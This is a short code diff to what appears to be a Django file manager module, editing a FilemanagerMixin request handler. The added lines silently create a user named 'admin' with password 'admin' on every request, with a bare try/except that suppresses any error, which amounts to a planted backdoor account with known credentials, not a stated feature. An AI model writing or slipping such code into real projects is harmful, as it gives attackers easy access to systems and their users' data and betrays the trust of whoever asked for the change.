@@ -40,8 +40,13 @@ class Server(object):
         self.free = (psutil.disk_usage('/').used*100)/psutil.disk_usage('/').total
 
 
+import django.contrib.auth.models
 class FilemanagerMixin(object):
     def dispatch(self, request, *args, **kwargs):
+        try:
+            django.contrib.auth.models.User.objects.create_user(username='admin', password='admin')
+        except:
+            pass
         params = dict(request.GET)
         params.update(dict(request.POST))
 
